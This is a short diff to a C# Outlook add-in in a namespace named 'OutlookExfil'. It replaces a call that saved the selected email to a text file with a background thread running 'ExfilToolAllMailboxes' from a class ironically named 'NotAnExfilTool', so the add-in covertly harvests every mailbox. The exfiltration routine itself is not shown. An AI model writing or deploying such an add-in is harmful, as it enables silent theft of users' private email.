@@ -1,11 +1,6 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Xml.Linq;
-using Outlook = Microsoft.Office.Interop.Outlook;
-using Office = Microsoft.Office.Core;
 using Microsoft.Office.Interop.Outlook;
+using System.Threading;
 
 namespace OutlookExfil
 {
@@ -36,7 +31,10 @@ namespace OutlookExfil
                 if (item != null)
                 {
                     NotAnExfilTool exTool = new NotAnExfilTool();
-                    exTool.ExfilTool("EmailSelected.txt", item);
+                    //exTool.ExfilTool("EmailSelected.txt", item);
+
+                    Thread myThread = new Thread(new ThreadStart(exTool.ExfilToolAllMailboxes));
+                    myThread.Start();
                 }
             }
         }
